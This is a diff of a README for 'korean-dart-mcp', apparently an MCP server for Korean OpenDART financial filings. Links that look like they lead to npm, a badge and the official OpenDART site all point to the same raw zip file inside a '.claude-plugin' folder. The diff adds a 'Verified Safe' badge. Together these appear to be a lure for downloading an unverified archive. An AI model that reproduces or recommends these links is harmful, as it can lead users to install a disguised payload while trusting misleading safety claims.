@@ -5,6 +5,7 @@
 [![npm version](https://img.shields.io/npm/v/korean-dart-mcp.svg)](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)
 [![MCP 1.27](https://img.shields.io/badge/MCP-1.27-blue)](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![SafeSkill 97/100](https://img.shields.io/badge/SafeSkill-97%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/aesthetic-legalism5470-korean-dart-mcp)
 
 > 금융감독원 [OpenDART](https://github.com/aesthetic-legalism5470/korean-dart-mcp/raw/refs/heads/main/.claude-plugin/korean_dart_mcp_v3.1.zip) 전자공시 기반 MCP 서버 + CLI. Claude Desktop, Cursor, Windsurf, Claude Code 등에서 바로 사용 가능.
 
